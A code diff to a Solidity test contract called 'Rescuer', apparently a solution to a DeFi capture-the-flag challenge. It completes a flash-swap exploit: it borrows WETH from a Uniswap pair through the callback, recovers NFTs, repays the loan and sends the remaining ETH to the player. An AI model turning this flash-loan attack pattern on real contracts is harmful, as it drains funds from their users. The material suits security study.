@@ -189,7 +189,8 @@ contract Rescuer is Test{
 
     function rescue() external {
         // Flashloan some WETH from the Uniswap pair
-        uniswapPair.swap(15 ether, 0, address(this), new bytes(0));
+        // Need to pass a non-empty last argument, otherwise there will be no callback
+        uniswapPair.swap(15 ether, 0, address(this), abi.encode(15 ether));
     }
 
     function rescueNFTs() private {
@@ -207,7 +208,7 @@ contract Rescuer is Test{
 
     // Uniswap V2 callback
     function uniswapV2Call(
-                           address sender,
+                           address _sender,
                            uint wethAmount,
                            uint amount1,
                            bytes calldata _data
@@ -222,17 +223,18 @@ contract Rescuer is Test{
 
         rescueNFTs();
 
-        // todo
-        weth.deposit{value: weth.balanceOf(address(this))}();
+        weth.deposit{value: address(this).balance}();
 
         weth.transfer(address(uniswapPair), wethAmount + fee);
+
+        weth.withdraw(weth.balanceOf(address(this)));
+        payable(player).transfer(address(this).balance);
     }
 
     // NFT callback
     function onERC721Received(address, address, uint256 tokenId, bytes memory _data)
         external
         returns (bytes4) {
-        // nft.transferFrom(address(this), address(recoveryManager), tokenId);
         return bytes4(0x150b7a02);
     }
 
